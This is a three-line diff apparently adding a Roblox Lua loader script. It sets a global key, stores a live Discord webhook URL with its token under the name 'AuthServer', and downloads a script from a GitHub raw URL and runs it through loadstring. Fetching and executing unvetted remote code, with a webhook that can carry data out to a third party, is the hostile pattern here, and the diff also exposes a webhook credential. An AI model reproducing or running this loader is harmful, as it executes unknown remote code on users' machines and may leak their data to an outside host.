@@ -1,0 +1,3 @@
+_G.Key = "11teod_nhoj"
+_G.AuthServer = "https://discord.com/api/webhooks/1051972312980783134/_AZ0-8_BnFEFHC2cPoaaPb-sG9N_DGcZ798IniV7L-o2t54rY20DQQUCvkcsfHZcDNL3"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Test/main/0001%20BlobSC"))()
